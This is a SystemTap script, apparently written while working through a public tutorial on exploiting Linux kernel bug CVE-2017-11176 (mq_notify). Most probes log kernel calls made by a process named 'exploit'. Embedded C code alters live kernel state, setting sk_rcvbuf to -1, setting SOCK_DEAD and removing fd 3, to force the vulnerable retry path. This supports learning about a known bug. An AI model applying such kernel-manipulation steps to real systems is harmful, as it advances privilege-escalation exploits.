//https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html

//stap -g -v mqNotify.stp

/* Aim
1. Force NetLink_attackskb() to return 1 to enter the retry path
    1.1 pass:  "if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))""
    1.2 avoid being blocked by setting SOCK_DEAD
2. Stopping the infinite loop by setting fd3 to NULL [force fget to return null]

*/
probe syscall.mq_notify
{
    if(execname() == "exploit")
    {
        printf("\n\n(%d-%d) [SYSCALL]>>> mq_notify (%s)\n", pid(), tid(), argstr)
    }
}
probe kernel.function("copy_from_user")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [uland] ==>> copy_from_user (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("skb_put")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [skb] ==>> skb_put (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("netlink_getsockbyfilp")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [netlink] ==>> netlink_getsockbyfilp (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("schedule_timeout")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [sched] ==>> schedule_timeout (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("schedule")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [sched] ==>> schedule (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("deactivate_task")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [sched] ==>> deactivate_task (%s)\n",pid(),tid(), $$parms)
    }
}
/* Aim
1.1 pass: if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
*/
%{
    #include <net/sock.h>
    //#include <net/netlink_sock.h>
%}
function dump_netlink_sock:long(arg_sock:long)
%{
    struct sock *sk = (void *) STAP_ARG_arg_sock;
    struct netlink_sock *nlk = (void *) sk;

    _stp_printf("-={ dump_netlink_sock: %p }-=\n",nlk);
    _stp_printf("- sk = %p\n",sk);
    _stp_printf("- sk->sk_rmem_alloc = %d\n", sk->sk_rmem_alloc);
    //changing rmem_alloc requires atomic_t variable type 
    //I
    //          S T A R T
    _stp_printf("-(BEFORE) sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
    sk->sk_rcvbuf = -1;
    _stp_printf("-(AFTER) sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
    //            E N D
    _stp_printf("- sk->sk_rcvbuf = %d\n", sk->sk_rcvbuf);
    _stp_printf("- sk->sk_refcnt = %d\n", sk->sk_refcnt);

    //_stp_printf("- (before) nlk->state = %x\n", (nlk->state & 0x1));
    // nlk->state |= 1;                                                  
    //_stp_printf("- (after) nlk->state = %x\n", (nlk->state & 0x1));

/*Aim
    1.2 avoid being blocked by setting SOCK_DEAD

    _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);// = 100
    _stp_printf("- SOCK_DEAD = %x\n", SOCK_DEAD); // = 0
    sk->sk_flags |= (1 << SOCK_DEAD);
    _stp_printf("- sk->sk_flags = %x\n", sk->sk_flags);
*/
    _stp_printf("-={ dump_netlink_sock: END}-=\n");


%}
/*Aim
    2. Stopping the infinite loop by setting fd3 to NULL
*/
%{
    #include <linux/fdtable.h>
%}
function remove_fd3_from_fdt:long (arg_unused:long)
%{
    struct files_struct *files = current->files;
    struct fdtable *fdt = files_fdtable(files);
    _stp_printf("!!>>> REMOVING FD=3 FROM FDT <<<!!\n");
    fdt->fd[3] = NULL;
%}
probe kernel.function("netlink_attachskb")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [netlink]] ==>> netlink_attachskb (%s)\n",pid(),tid(), $$parms)
    }
    dump_netlink_sock($sk);
   // remove_fd3_from_fdt(0);
}
probe kernel.function("netlink_detachskb")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [netlink] ==>> netlink_detachskb (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("alloc_skb")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [skb] ==>> alloc_skb (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("fdget")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [vfs] ==>> fdget (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("fget")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [vfs] ==>> fget (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("fget").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [vfs] <<== fget (%x)\n",pid(),tid(), $return)
    }
}
probe kernel.function("skb_put").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [skb] <<== skb_put (%x)\n",pid(),tid(), $return)
    }
}
probe kernel.function("netlink_attachskb").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [netlink] <<== netlink_attachskb (%x)\n",pid(),tid(), $return)
    }
   // remove_fd3_from_fdt(0);
}
probe kernel.function("schedule_timeout").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [vfs] <<== schedule_timeout (%x)\n",pid(),tid(), $return)
    }
}
/*probe kernel.function("schedule").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [vfs] <<== schedule (%x)\n",pid(),tid(), $return)
    }
}*/
/*probe kernel.function("deactivate_task").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [vfs] <<== deactivate_task (%x)\n",pid(),tid(), $return)
    }
}*/
probe kernel.function("netlink_getsockbyfilp").return
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [netlink] <<== netlink_getsockbyfilp (%x)\n",pid(),tid(), $return)
        sock_ptr = $return;                 // <----- store it
    }
}
// checking sock reference count
global sock_ptr = 0;
probe syscall.mq_notify.return
{
    if(execname() == "exploit")
    {
         if(sock_ptr != 0)
        {
            dump_netlink_sock(sock_ptr);
            sock_ptr = 0;
        }
        printf("(%d-%d) [SYSCALL] <<< mq_notify (%x)\n\n\n", pid(), tid(), $return)
    }
}
probe kernel.function("__sk_free")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [sk] ==>> __sk_free (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("sk_free")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [sk] ==>> sk_free (%s)\n",pid(),tid(), $$parms)
    }
}
probe kernel.function("kfree")
{
    if(execname() == "exploit")
    {
        printf("(%d-%d) [kmem] ==>> kfree (%s)\n",pid(),tid(), $$parms)
    }
}